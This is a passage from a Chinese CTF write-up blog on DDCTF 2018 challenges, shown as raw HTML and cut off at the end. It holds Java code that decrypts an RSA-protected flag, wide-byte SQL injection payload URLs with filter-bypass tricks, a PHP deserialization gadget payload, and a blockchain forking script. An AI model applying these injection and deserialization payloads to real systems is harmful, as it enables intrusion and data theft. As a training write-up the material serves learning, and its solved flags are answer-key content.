class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class cipher &#123;</span><br><span class=\"line\">    public static  void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        gencipher();</span><br><span class=\"line\">//        String email = &quot;email&quot;;</span><br><span class=\"line\">//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        mac.init(signingKey);</span><br><span class=\"line\">//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class=\"line\">//        System.out.println(byte2hex(e));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void gencipher() throws Exception &#123;</span><br><span class=\"line\">        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);</span><br><span class=\"line\">        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;</span><br><span class=\"line\">        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">        FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">        keyStore.load(inputStream, p.toCharArray());</span><br><span class=\"line\">//        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, p.toCharArray());</span><br><span class=\"line\">        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();</span><br><span class=\"line\">        Cipher cipher = Cipher.getInstance(key.getAlgorithm());</span><br><span class=\"line\">        cipher.init(2, key);</span><br><span class=\"line\">        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;</span><br><span class=\"line\">        byte[] data = cipher.doFinal(hexStringToBytes(flag));</span><br><span class=\"line\">        System.out.println(new String(data));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static String byte2hex(byte[] b) &#123;</span><br><span class=\"line\">        StringBuilder hs = new StringBuilder();</span><br><span class=\"line\"></span><br><span class=\"line\">        for(int n = 0; b != null &amp;&amp; n &lt; b.length; ++n) &#123;</span><br><span class=\"line\">            String stmp = Integer.toHexString(b[n] &amp; 255);</span><br><span class=\"line\">            if(stmp.length() == 1) &#123;</span><br><span class=\"line\">                hs.append(&apos;0&apos;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            hs.append(stmp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        return hs.toString().toUpperCase();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static byte[] hexStringToBytes(String hexString) &#123;</span><br><span class=\"line\">        if (hexString == null || hexString.equals(&quot;&quot;)) &#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        hexString = hexString.toUpperCase();</span><br><span class=\"line\">        int length = hexString.length() / 2;</span><br><span class=\"line\">        char[] hexChars = hexString.toCharArray();</span><br><span class=\"line\">        byte[] d = new byte[length];</span><br><span class=\"line\">        for (int i = 0; i &lt; length; i++) &#123;</span><br><span class=\"line\">            int pos = i * 2;</span><br><span class=\"line\">            d[i] = (byte) (charToByte(hexChars[pos]) &lt;&lt; 4 | charToByte(hexChars[pos + 1]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return d;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static byte charToByte(char c) &#123;</span><br><span class=\"line\">        return (byte) &quot;0123456789ABCDEF&quot;.indexOf(c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//        String email = &quot;email&quot;;</span><br><span class=\"line\">//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        mac.init(signingKey);</span><br><span class=\"line\">//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class=\"line\">//        System.out.println(byte2hex(e));</span><br></pre></td></tr></table></figure>\n<p>拿到该加密后的邮箱，就可以获得加密后的flag。</p>\n<p> <img src=\"/assets/ddctf/20180421191047.png\" alt=\"avatar\"></p>\n<p>拿到加密之后的flag之后，就可以解密了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void gencipher() throws Exception &#123;</span><br><span class=\"line\">        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);</span><br><span class=\"line\">        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;</span><br><span class=\"line\">        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">        FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">        keyStore.load(inputStream, p.toCharArray());</span><br><span class=\"line\">        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();</span><br><span class=\"line\">        Cipher cipher = Cipher.getInstance(key.getAlgorithm());</span><br><span class=\"line\">        cipher.init(2, key);</span><br><span class=\"line\">        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;</span><br><span class=\"line\">        byte[] data = cipher.doFinal(hexStringToBytes(flag));</span><br><span class=\"line\">        System.out.println(new String(data));</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;</span><br><span class=\"line\">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">keyStore.load(inputStream, p.toCharArray());</span><br><span class=\"line\">Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();</span><br></pre></td></tr></table></figure>\n<p>然后就可以解密得到flag.</p>\n<blockquote>\n<p>DDCTF{5218295657878818503}</p>\n</blockquote>\n<h1 id=\"注入的奥妙\"><a href=\"#注入的奥妙\" class=\"headerlink\" title=\"注入的奥妙\"></a>注入的奥妙</h1><h2 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h2><p>首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号”‘“，发现输出竟然乱码。</p>\n<p> <img src=\"/assets/ddctf/20180421195946.png\" alt=\"avatar\"></p>\n<p> 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。</p>\n<p> <img src=\"/assets/ddctf/20180421200130.png\" alt=\"avatar\"></p>\n<p> 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（<a href=\"https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\" target=\"_blank\" rel=\"noopener\">https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。</a></p>\n<p> <img src=\"/assets/ddctf/20180421200307.png\" alt=\"avatar\"></p>\n<p> 我选择了”么”</p>\n<p> <img src=\"/assets/ddctf/20180421200748.png\" alt=\"avatar\"></p>\n<p>通过测<code>http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88</code>，可以看到单引号成功逃逸。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 最后拼接的参数是 : ?\\\\&apos;</span><br><span class=\"line\">~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~</span><br><span class=\"line\">很遗憾没有找到数据 可以试试别的 ！</span><br><span class=\"line\">42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;?\\\\&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>\n<p>单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加”collate utf8_general_cli”,强制转换编码即可。</p>\n<ul>\n<li><p>获取数据库。</p>\n<p> <code>http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88&#39;%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23</code></p>\n<p> 得到结果”sqli”</p>\n</li>\n<li><p>获取’sqli’下的table。</p>\n<p> <code>http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么&#39; uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23</code><br> 得到结果”message,route_rules”</p>\n</li>\n<li><p>获取”route_rules”的列名。</p>\n</li>\n<li><p><code>http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么&#39; uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23</code><br> 得到结果”id,pattern,action,rulepass”</p>\n</li>\n<li><p>然后获取route_rules表中的数据。<br> 数据如下:<br> 1   get<em>/   u/well/getmessage/<br> 12  get</em>/   u/justtry/self/<br> 13  post*/  u/justtry/try<br> 15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip</p>\n</li>\n</ul>\n<h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p>通过上边的<code>116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css</code>，可以拿到代码。</p>\n<ul>\n<li>Jusstry.php</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public function try($serialize)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    unserialize(urldecode($serialize), [&quot;allowed_classes&quot; =&gt; [&quot;Index\\Helper\\Flag&quot;, &quot;Index\\Helper\\SQL&quot;,&quot;Index\\Helper\\Test&quot;]]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。</p>\n<ul>\n<li>Flag.php</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace Index\\Helper;</span><br><span class=\"line\"></span><br><span class=\"line\">use PDO;</span><br><span class=\"line\">use Index\\Helper\\SQL;</span><br><span class=\"line\"></span><br><span class=\"line\">defined(&apos;ACCESS_FILE&apos;) or exit(&apos;No direct script access allowed&apos;);</span><br><span class=\"line\">class Flag</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $sql;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;sql=new SQL();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function get($user)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        $tmp=$this-&gt;sql-&gt;FlagGet($user);</span><br><span class=\"line\">        if ($tmp[&apos;status&apos;]===1) &#123;</span><br><span class=\"line\">            return $this-&gt;sql-&gt;FlagGet($user)[&apos;flag&apos;];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该类说明只要调用get方法就可以得到指定用户的flag。</p>\n<ul>\n<li>Test.php</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Test</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;</span><br><span class=\"line\">    public $fl;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &apos;hhkjjhkhjkhjkhkjhkhkhk&apos;;</span><br><span class=\"line\">        $this-&gt;fl = new Flag();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;getflag(&apos;ctfuser&apos;, $this-&gt;user_uuid);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function setflag($m = &apos;ctfuser&apos;, $u = &apos;default&apos;, $o = &apos;default&apos;)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $user=array(</span><br><span class=\"line\">            &apos;name&apos; =&gt; $m,</span><br><span class=\"line\">            &apos;oldid&apos; =&gt; $o,</span><br><span class=\"line\">            &apos;id&apos; =&gt; $u</span><br><span class=\"line\">        );</span><br><span class=\"line\">        // var_dump($user);</span><br><span class=\"line\"></span><br><span class=\"line\">        echo $this-&gt;fl-&gt;set($user, 2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getflag($m = &apos;ctfuser&apos;, $u = &apos;default&apos;)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //TODO: check username</span><br><span class=\"line\">        $user=array(</span><br><span class=\"line\">            &apos;name&apos; =&gt; $m,</span><br><span class=\"line\">            &apos;id&apos; =&gt; $u</span><br><span class=\"line\">        );</span><br><span class=\"line\">        //懒了直接输出给你们了</span><br><span class=\"line\">        echo &apos;DDCTF&#123;&apos;.$this-&gt;fl-&gt;get($user).&apos;&#125;&apos;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace Index\\Helper;</span><br><span class=\"line\"></span><br><span class=\"line\">use Index\\Helper\\Flag;</span><br><span class=\"line\">use Index\\Helper\\UUID;</span><br><span class=\"line\"></span><br><span class=\"line\">class SQL</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $dbc;</span><br><span class=\"line\">    public $pdo;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Flag</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $sql;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;sql=new SQL();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// defined(&apos;ACCESS_FILE&apos;) or exit(&apos;No direct script access allowed&apos;);</span><br><span class=\"line\">class Test</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;</span><br><span class=\"line\">    public $fl;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &apos;hhkjjhkhjkhjkhkjhkhkhk&apos;;</span><br><span class=\"line\">        $this-&gt;fl = new Flag();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        // $this-&gt;getflag(&apos;ctfuser&apos;, $this-&gt;user_uuid);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize(new Test());</span><br></pre></td></tr></table></figure>\n<p>即可得到序列化之后的值:”hhkjjhkhjkhjkhkjhkhkhkO:17:”Index\\Helper\\Test”:2:{s:9:”user_uuid”;s:36:”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”;s:2:”fl”;O:17:”Index\\Helper\\Flag”:1:{s:3:”sql”;O:16:”Index\\Helper\\SQL”:2:{s:3:”dbc”;N;s:3:”pdo”;N;}}}”,然后就可以得到flag了。</p>\n<p> <img src=\"/assets/ddctf/20180421150038.png\" alt=\"avatar\"></p>\n<h1 id=\"mini-blockchain\"><a href=\"#mini-blockchain\" class=\"headerlink\" title=\"mini blockchain\"></a>mini blockchain</h1><h2 id=\"构造符合条件的区块\"><a href=\"#构造符合条件的区块\" class=\"headerlink\" title=\"构造符合条件的区块\"></a>构造符合条件的区块</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\">from itertools import product</span><br><span class=\"line\">import string</span><br><span class=\"line\">from functools import reduce</span><br><span class=\"line\">import rsa</span><br><span class=\"line\"></span><br><span class=\"line\">EMPTY_HASH = &apos;0&apos; * 64</span><br><span class=\"line\"></span><br><span class=\"line\">def hash(x):</span><br><span class=\"line\">    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def hash_reducer(x, y):</span><br><span class=\"line\">    return hash(hash(x) + hash(y))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def hash_block(block):</span><br><span class=\"line\">    return reduce(hash_reducer, [block[&apos;prev&apos;], block[&apos;nonce&apos;],</span><br><span class=\"line\">                                 reduce(hash_reducer, [tx[&apos;hash&apos;] for tx in block[&apos;transactions&apos;]], EMPTY_HASH)])</span><br><span class=\"line\"></span><br><span class=\"line\">block = &#123;</span><br><span class=\"line\">    &quot;nonce&quot;: &quot;6h0F&quot;,</span><br><span class=\"line\">    &quot;prev&quot;: &quot;0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8&quot;,</span><br><span class=\"line\">    &quot;transactions&quot;: []</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">c = string.ascii_lowercase + &quot;0123456789ABCDEFGHI&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">captchas = [&apos;&apos;.join(i) for i in product(c, repeat=4)]</span><br><span class=\"line\"></span><br><span class=\"line\">print(&apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas)))</span><br><span class=\"line\">with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class=\"line\">    for k in captchas:</span><br><span class=\"line\">        block[&quot;nonce&quot;] = k</span><br><span class=\"line\">        f.write(hash_block(block)[:5] + &apos; --&gt; &apos; + k + &apos;\\n&apos;)</span><br></pre></td></tr></table></figure>\n<p>“nonce”值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。</p>\n<h2 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>初始区块链如图所示:</p>\n<p> <img src=\"/assets/ddctf/20180421221550.png\" alt=\"avatar\"></p>\n<p>然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block[‘height’]来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def find_blockchain_tail():</span><br><span class=\"line\">    return max(session[&apos;blocks&apos;].values(), key=lambda block: block[&apos;height&apos;])</span><br></pre></td></tr></table></figure>\n<p> <img src=\"/assets/ddctf/20180421222032.png\" alt=\"avatar\"></p>\n<p>从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。</p>\n<p> <img src=\"/assets/ddctf/20180421222814.png\" alt=\"avatar\"></p>\n<p>接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。</p>\n<p> <img src=\"/assets/ddctf/20180421223014.png\" alt=\"avatar\"></p>\n<p>需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。</p>\n<h1 id=\"我的博客\"><a href=\"#我的博客\" class=\"headerlink\" title=\"我的博客\"></a>我的博客</h1><h2 id=\"审计代码-1\"><a href=\"#审计代码-1\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>根据提示，下载<a href=\"http://www.tar.gz,里边共有三个文件，index.php\" target=\"_blank\" rel=\"noopener\">www.tar.gz,里边共有三个文件，index.php</a>, login.php, register.php。</p>\n<h3 id=\"index-php\"><a href=\"#index-php\" class=\"headerlink\" title=\"index.php\"></a>index.php</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 